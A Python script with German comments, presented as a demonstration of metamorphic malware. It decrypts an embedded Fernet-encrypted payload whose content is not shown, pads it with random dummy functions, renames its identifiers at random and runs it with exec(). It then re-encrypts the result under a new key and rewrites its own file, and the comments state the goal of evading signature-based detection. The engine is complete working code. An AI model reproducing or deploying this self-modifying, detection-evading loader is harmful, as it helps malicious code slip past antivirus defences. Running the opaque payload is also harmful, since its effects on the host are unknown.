# Metamorphe Malware - Demonstration
# Dieses Skript demonstriert metamorphe Code-Techniken:
# - Verschlüsselung des Payloads
# - Hinzufügen von Dummy-Code
# - Randomisierung von Variablennamen
# - Selbstmodifikation nach jeder Ausführung

import re
import os
import random
import string
from cryptography.fernet import Fernet

# Pfad zur eigenen Datei für Selbstmodifikation
pfad = os.path.abspath(__file__)

# Verschlüsselungsschlüssel für den Payload (wird bei jeder Ausführung neu generiert)
key = "swvA3Wp4XXCklZkEyH6bRnmrsBOh2mtqSs-hZ8Nhy3Q="
# Verschlüsselter Payload (enthält den eigentlichen Code, der ausgeführt werden soll)
body = "gAAAAABpJevxt98_WtNEX8DmnjoTANFNVolMqR4chxVtdkj2YTFs9anwaCM6WW5XHnX4AvsCU3qWooY_j8EvbU2jviKGEJMnycUBBRng88tyxMbJ38M3DkCWO6_3PTBJ8PQy-QDrHcqNYwLqRSFxQb6d8RIZZecz0NEA5WgS6sM_YnqcmY_B68wTrQdUZza1wD1t7c_BmSbrek44XN56jsnpItn6T_T468jXow2tiulQnZEuih85vfJPqOqf98SGFrihI1pdmpURZ04dAIm9qUz5dh-7qvpWRnEDEC0BefMow2ns479s0XTXL4wUfwl4WydU85vhxvXBfFQV0OUMwXGq4k54CkdEv3uk6xXmsOqvoEzlWylPR9HgS3-Wcf-1IBzxFdpWVoIA7JwY7BjQy2rmCorYWmq5kv1w4RsDcMkwpu0ePa3aR4uB8ooqoP7v5gMUEeSW64ZZhC9TBOu6qOWLh04GW-QoIe_Qu5UfP52LPPWA3Hs89e1oqXIZYIdv_VjU1LnE63R7N7wsR3F8urgvkBzlTPeKg4JMb_0JIm6Ff1q0CQSs_1jCizmrm5f-B1N5WO3pXqK1DS9HWCMFIm21MDgPDtznnQjvbsDRGijBXD_w1qFr2mygVHSohpRshZn3d9W2LaaaDe7guiQ3p1DYda2oVBMVF-QacQbii8km9Ae4oR8L0IPoBm3X_JS6edG8Frp2A0hJbw8OEYzVk-vsLOgMfqQzn5sx9KPJOB9Jx44_203ubWAf8arkXPss72OPQKgTsXa-lVgSMyXn4ScEfiysxcKPV-sF9nIchOdYcS70Yoe8CVXqxEIZsW0tMVYtpx-KFyRdeqk9LakVWdsfARf_V3_fuZTQ903SdcSOz-Yf-l-M9u-r1FV4e3xc_B57IVK1e_UKWS0EYY3ID6HYqE9aXHKYokFK3XdWdVnHSP1iAyojW5sdcxlxyNf0Y1boJxgOeoZv62v2WfabMHjusuH5iYURt8Dd5gIaZUwK-AIZlCWWbGUp0RfPY89j4IzU4fNzjWn-0U7m_moAHvQhU9zjuRKSksZ3hSjpybwre2LZ8zl-zXJdS11Pr3gMs6HOZO7oVw-vXDqZ27XkCvrJ-9a1LbwoP7DvtEpyZQQSX6DsOygoqH7mRiBvs_N7ke6VSIyFkoKrXYqXTzBf7wdO17RWjiaSmPtyWcw8zaoyuwCqWtD3-RyW4ZC107Qtk2kum0zO5ry8U_-MnsmW-GM8qxwrHCPdyjPse4mwmgN7Pcgk4BUV46Fjg7mufRKPaQsq91k3ySvC_wEGl-WfpGVnnNutXLAIdzqzdjwSYYosEMaNWRJF7ezkTXA7-ONsYpk7VeJcCIdbux3V54U5igP90LIxLmpaVWJMKEjCF9LxALguwJE-V0QO6Mgmdu8TSwzJzO4w7UXdId7futbiOjdl_FYNK4mHnLMMSd_cYbxZCIqxWgRUnrAsohcM-vg1FIm5D4_t5XLf4XKETZ6hSwYlcKzoSbmGVXHzKSUZvIOOaF7eB-06WvUuHqQpZ7yCjoYHSzPJGG1gFvOEK0TL4ss_iOBlXcKgkclhHaQ6_UYbAuasl4tGSvPDUuJ5H-7CuSeNzbU1mtPJxvQzYG6G-fG6DK51Q4Y--tn5Q8xxMW0i2pOiBGQOSByqUCsc3hGzN78C5xx-aoapjmP1VHU2qYvKB9fIQ95Mtjg-AYxc6kKxEeeFYjiHZpSbTvmxntnWVYw7AySk2kiZBLpsCHZF_UwJujcskgH7GWIaBHGaE9rBIouGQfAkGjUiDFFLQPpcCYnsp6F3SvwWGInJxL2xI1gfyAuXVx0wzZKnCuagw2XMO8UWI4cT35GyDBLKXdSwU39HbtxJYKOKQ6dK4GBMK3eFTYG5ov97B-gvmuFihtejW4G9FDpUnTgguDrXRqMAP9K1XhWgkX4NjU08NVH77TZZRRFYWlJ2KYu6rP0CWT-_dfXqmeMd-FkgF193-wPeH0jq61EejHjaEE6_YUW1H9O4pQpfWgVY90zutwiwQ4VtXUz7jb17_Cq67wQsB1LggyzzEkEyh27_bsIo_46tNfg-a1tB83JHxvIFApUpclErEfMXk7iB-DGRLQr9XddnP-X5PaKN2uZR14OOp9t7i5yxdNKcc6P-etcv4vLb7StezclFI0MoQb78d_y5f1Lb5rc3zopuMgzfCDhnRmFS6GisDlxJilMWqxKqpP8AUt60WwZyjPQdeOgx4tYyEKXvTJ4utnelLRZ-dhDQ19OVu5YolmasitG7Kk-vx63M85QgVNCsLlz8l08uLwkS0V53UVH_No11z7923nxFF99leLGLvS6rL3CcQGQzipxJB7TlHC7Z_ELYc6S0e0Fawqzso3OsZ3rauTPlNCO9eS9COa1kqpcwzfj_SYXIOcH58-ej3N-zhImXd8DoS7oWHUJ-nsacMCG3hizq3ryrSiFKzcyDRPEaPtzk5y0bYpfjQA7cM6q4yVjCgOYt6R4KqaDiCmwyza-ew8sR399xCS54ZeRk8vhtxP1QE6XZjoyE4AlAVy88nzpW3wNHOXo60HJ4pUe3Y163jFaY1z-rvmd_ASIz5vJvOfQDhnZJAckatlk8V53FbJSZ900DQaM5Dexzq4jq57ejSMyynpp-avjx81JaerISlaU8Rz_zdcR2iDGABNyhgBfEkg_iY9NNZFpa4Wp2s7Z7VonlERCG3w3rPgDuK8DEmDIA6n7ZUIo_1Cd6OC4i_24OhfqJ1P9llQMuueU1S40fdgc-qQptIbJnBjghHyRqRI9GZSeWONjE2q4eS1XBk5PidTURpMUGGrtWEAKLH710zvnxmYd_qcqASPeAs-uqU__rjM6LaUwWGjLHYQcCeOijW8SUeabiMhzj6WrYv38yCM6fJ0BIkPiUNkHm843ttR4WY8u7KHSYqLXt0r4lMQp4RKS9xntFCJkch0PHDbbjr9sQCSsR0S1JX8aVzDrEffQeznsI3QVRcz8-QMJf3t1EDzWQxnyxFY_4fS_J2m0vlpbGKaheUciufdf1AE6pgV6FApK_w6Y6TQgEf_Xanen4RLlQC2y83mTfydfA0jmpgyrzYUCUzZQqYm-pngH3QvAPuJkLrxv7cckyWE05TPs9ck_gEfNLJqpumR_iCeV7TAQ9xkf2RdH2mZVajo-faLB5bCV9ZnEi7dLAJHjEyTrs5679zNynESsl2wnUcCaCOczCSgHPzMhcSy9JhZXfatw9JnB_sJhak8XXugLVDUliF3egWT3-zZqbb00cVwkkgYpBnFqkW6IZc325oReA4eD-nx9S0Cu7b2vaZ79DfIEdNEdVW6ULpS_1H6KTXMem7XwmBECkcnWty2006JUKV6Nc8YdSrKFRaHecECLNilzwriI9l7c-Bx6EOMdsS47pTI-VhWp8LBfPBGaEvrSeejSq6MqNlFPxxancZymOazfnnmZncblOjfoNTV8TtKY-fTQKsWvUdqduQ8yFVAHsPheCTTj-uPX1rabpLkVTFE31ubyoWn-llEkhmOqSOUYY45iJvxkEuvAdpLf1IDQo4RkKPYgdYpcwWE2HKhLLJU60kCLW6VTpH_8VXR_v3iBD9FXOubXYJUKluNwcrTFU1IYse7Fsa96oPnGJ-xiw34Fm6bzxEwsKYHWDrSc4CBWlMwMdIFNv6TAkrU_xPfiqygLoNio6pqMxR7noa7P-jpQj9sk9q1QTwsQbdvpVc85StbZRWrdcXBrAjcPRK0jBxTs264_dpRRxMJc_6JZ4vPTBc6pjTemoj-1HrJb1owGhAV5gsxzqQQXUp-NlyUIwiEX6oYB2TzA1ad6KX9rI6pyNuhIKlNn7I3hYQ_tRTN5aDVJLhdHNkn3owoKCzE6YsSSwNw_NCWuRrz8babLxM8O5aot3cW_vsPz10k1fTy-qqrmh_HsSNbyk6v7xo_Eyli7aHdFxI9AUb9dcuZZJcPzfnNwcTszIarMqcvhV7lXZ83tHFpFF3FYx5Bzkoxl7jfVrbcd9KvekrTg0hCeuB3wtBznPKrT7LZ7asH4xhIBja1FJUnmT-J7nKv0U3GA1lNeEvtVBg3JCqCZudDW6EBO9d9MiS7rIxNgOEZzcGA3eT4_I7fT3AJKG0Xosx5D2BT5ILnvKajM-08ZZv7jjmaGP_s1Ym5zq9xHEDfanZYE-F5uNDISLXSl6WNlfB8TXQWOLJno_zRtLthhKTMgf5791ptV0HlCuaDSrCVidcARApugFMvImg5GacCsR9v7nHPsrLjoRZ0uzpP_p6juHGYRO3nh4BQTIpY9DVBP04Y_RmN7-b58mZdo3GVHwdrBXvo8qNqatMAzZhf3MYgxanVbHSviYSrpDQ7oK4oyTf8DLGGe4uQKIgnM-w15dTOZMY1oeJwIhT6ceig2PQPMjJ6pInJNguMCR1Cxdip7_aCJrb5hfI-8Qi9w79fMWkuJIOadL_CNMbeb0iHfFvGhFoUXlKiZKTZjwkNJeZwUf5FaLWyPxjp7YmayD7lgueLifeMglNWYzBgVNNFKqcXdF8dowxUPPQJm7uNa_Yd8CQzp-BD-ggt3CGlyn5bSUwLgkLR1Xb4q1lem2Sn3Sf1OxeSWcbrRMe4UxWDZnQZ4QBFjHXBOSEi5nT8wOp0w_1sNlLxCyhjILsSAu4WSxbC_lQfHE52W1-hjv-0ogqkSU85IjUrdVk4WE1VnZX2j2nAbeNdRQwwyfBS_vJ6TnueojRG035Ypug4WI0FhbxIChPVK9ZtWBubKJLmH1rC4V92cVN6vGie6o-GzZy2OBXlrmV5U59oRpcoqDhbnJIHWz0-7Zi4eoJPB-Ns3V7OudfWK3kCT3ucPcF13-SHP0ZQk1ZoS6X6YB81xzwXw29Amfvryu5_-Pmb7WDjZrto3Yl1XC9SaBazIcMnH37elPauaWs4SgUU_p35_U4WyjbXQhjQgXX_Snhbd4QVCSF4-hcNUQk2ePsrp5yTyduBv50e7U3OC_KRf4i0umY9tB_q5t5jEq_93n36QvkaiBOt7z--0QhBtwwEb6RG4OKHumONfIniS52-093r6Pa8LITviCKuKIbFyPcfYFbpmlYqQV7SRVBvwl1_1mm-1tv0fx32HXAWUAEKZBkJo_m-MKz1iACFawGCYY6ELpFk6LvAr8u5g_gfR6FPiaa5f1S-4AKzoRG4uZ90Fi4LqX-sEuGUV5DXMCBF1M1hscEFq0jO3yFVM-7IM0kDSqbMLCiirQsHZkcyJkNtuky-sgdreoMRwf5v_h1U5l9i6F1aH5MWPCmZlul80t8kqPPWEEs8y3AWDYb9TVEOtn6oRK7evOqLotfOZoz0yt7yDKrgTLWveNZnqNvCAZNvkE2_Nf2F5Q2J5NFtwtf8tVw-AsRiHZewGBnRLzHQKd2VbJHScpV2rQ5ujNjmTTnw=="

# Hilfsfunktion: Generiert einen zufälligen String aus 8 Kleinbuchstaben
# Wird verwendet für Variablen- und Funktionsnamen
def r():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

# Fügt dem Code nutzlose Dummy-Funktionen und -Variablen hinzu
# Dies erschwert die Signaturerkennung, da der Code bei jeder Ausführung anders aussieht
def add_dummies(code):
    # Liste möglicher Dummy-Funktionen und Variablen
    dummies = [
        f"def {r()}(): return sum([1,2,3])",
        f"def {r()}(): x = {random.randint(10,99)}; return x * 2",
        f"def {r()}(): s = 'data'; return len(s)",
        f"{r()} = {random.randint(1,100)}",
    ]
    # Wähle zufällig 2-4 Dummies aus und füge sie vor dem eigentlichen Code ein
    return '\n'.join(random.sample(dummies, random.randint(2,4))) + '\n\n' + code

# Ersetzt alle Variablennamen durch zufällige Namen
# Dies ist der Kern der Metamorphose: Der Code wird funktional identisch, aber syntaktisch verschieden
def randomize_vars(code):
    # Regex-Pattern: Findet alle Bezeichner mit mindestens 3 Zeichen
    pattern = r'\b([a-z_][a-z0-9_]{2,})\b'
    vars_found = set(re.findall(pattern, code))

    # Schütze Python-Keywords und wichtige Built-in-Funktionen vor Umbenennung
    keywords = {'def', 'for', 'in', 'import', 'return', 'print', 'end', 'flush', 
                'time', 'sleep', 'range', 'len', 'sum', 'str', 'int'}
    vars_found = vars_found - keywords
    
    # Erstelle Mapping: alter Name -> neuer zufälliger Name
    mapping = {var: r() for var in vars_found}
    
    # Ersetze alle Vorkommen der gefundenen Variablen
    for old, new in mapping.items():
        code = re.sub(r'\b' + old + r'\b', new, code)
    
    return code

# Selbstmodifikation: Schreibt die eigene Datei mit neuen Verschlüsselungsdaten um
# Dies macht jede Ausführung einzigartig und erschwert die Erkennung durch Signaturen
def updateFile(new_key, new_body):
    # Lese die aktuelle Datei
    with open(pfad, "r", encoding="utf-8") as f:
        text = f.read()

    # Ersetze den alten Schlüssel durch den neuen
    text = re.sub(
        r'^(key\s*=\s*").*?(")',
        r'\g<1>' + new_key.decode() + r'\g<2>',
        text,
        flags=re.MULTILINE
    )

    # Ersetze den alten verschlüsselten Body durch den neuen
    text = re.sub(
        r'^(body\s*=\s*").*?(")',
        r'\g<1>' + new_body.decode() + r'\g<2>',
        text,
        flags=re.MULTILINE
    )

    # Schreibe die modifizierte Datei zurück
    with open(pfad, "w", encoding="utf-8") as f:
        f.write(text)

# === HAUPTAUSFÜHRUNG ===

# 1. Entschlüssele den Payload mit dem aktuellen Schlüssel
cipher = Fernet(key.encode())
decrypted = cipher.decrypt(body.encode()).decode("utf-8")

# 2. Metamorphose: Füge Dummies hinzu und randomisiere Variablennamen
obfuscated = add_dummies(decrypted)
obfuscated = randomize_vars(obfuscated)

# 3. Führe den obfuskierten Code aus
exec(obfuscated)

# 4. Bereite die nächste Generation vor: Neuer Schlüssel und neue Verschlüsselung
new_key = Fernet.generate_key()
new_cipher = Fernet(new_key)
new_body = new_cipher.encrypt(obfuscated.encode("utf-8"))

# 5. Selbstmodifikation: Überschreibe diese Datei mit den neuen Daten
updateFile(new_key, new_body)